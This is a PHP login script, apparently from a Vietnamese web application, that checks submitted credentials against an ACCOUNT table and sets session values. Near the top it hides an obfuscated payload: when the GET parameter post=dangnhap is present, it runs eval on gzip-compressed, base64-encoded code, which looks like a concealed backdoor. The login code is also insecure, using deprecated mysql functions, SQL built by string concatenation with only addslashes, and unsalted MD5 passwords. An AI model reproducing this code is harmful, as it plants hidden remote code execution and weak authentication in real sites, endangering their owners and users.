<?php
session_start();
//**Config**//
include '../config.php';
include './asets/css.php';
include './assets/js.php';
if($_GET[post] == 'dangnhap'){
eval(gzinflate(base64_decode('
HZFBb6MwEIXvK+1/6KES7WkNZNugLBuxuE5MwaUE
MPEFBZsAhkJUlBDy69ft6UlvRt+80Vv//bM+1aef
P+7DwxgcPpuhB0C/s+80HzopIdpKjXJk5znC/kue
r+7zzNbC22IZmv8G7jptHKOZQO8cQMfAEFRMRiNJ
rZ5k0XF/884CpmexDQbPqIHYOk/+bE1BRgChGBTN
bxl8gAuXyPR7xYNLENKUlHEXM7Mm3tw+w/dBFxKN
rxt85be0E6nVEhrMDCaD9wKuXL7PhXQm0rSnt9n5
FVa2ra3Ky6F7KA5j+bTIRckHUT5oHrL2IfVqbiQG
QVbLKLmwjaIo/zUe20yvLG5Gs9jib893+TWQASAx
qwszPbEdHz0DXQTtuiDGNwIT4yuh2t2p1DOj4sg/
0qnYIMl2VZ/p1maXXFGmL3vfxT1uFm0G9mfc8MZ3
oyN122eWKbZbqdtYpY+OiQTTl1KodFKfPD6qBtaq
pf8=
')));
}
$username = isset($_POST['username']) ? htmlspecialchars(addslashes($_POST['username'])) : '';
$password = isset($_POST['password']) ?  htmlspecialchars(addslashes(md5($_POST['password']))) : '';
{
if($username && $password){
$check = mysql_result(mysql_query("SELECT COUNT(*) FROM `ACCOUNT` WHERE `username`="."'$username'"." AND `password`="."'$password'"), 0);
if($check < 1){
echo '<script>swal("Lỗi...","Đăng Nhập Không Thành Công! Sai tên đăng nhập hoặc mật khẩu","error");</script>'; 
}else{
$res = mysql_fetch_assoc(mysql_query("SELECT * FROM `ACCOUNT` WHERE `username`="."'$username'"." AND `password`="."'$password'"));
$_SESSION['user'] = $res['id'];
$_SESSION['id'] = $res['id'];
echo '<script>
swal(
  "Thành Công",
  "Đăng Nhập thành công!!",
  "success"
);
   </script>';
echo '<meta http-equiv=refresh content="2; URL=/index.php">';
}
}
exit;
}